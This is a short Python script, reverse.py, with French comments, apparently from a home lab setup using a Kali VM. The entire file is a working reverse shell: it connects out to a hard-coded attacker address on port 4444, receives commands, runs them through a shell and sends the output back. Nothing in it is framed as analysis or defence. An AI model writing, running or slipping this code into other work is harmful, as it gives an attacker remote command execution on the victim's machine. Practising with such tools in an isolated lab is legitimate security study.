# reverse.py
import socket
import subprocess

def main():
    host = "192.168.56.101"  # Remplace par l'adresse IP de ta VM Kali
    port = 4444

    try:
        s = socket.socket()
        s.connect((host, port))

        while True:
            s.send(b'[+] Connecté ! Tape une commande : ')
            cmd = s.recv(1024).decode("utf-8")

            if cmd.lower() == "exit":
                break

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            s.send(result.stdout.encode() + result.stderr.encode())
    except Exception as e:
        print(f"Erreur : {e}")
    finally:
        s.close()

if __name__ == "__main__":
    main()
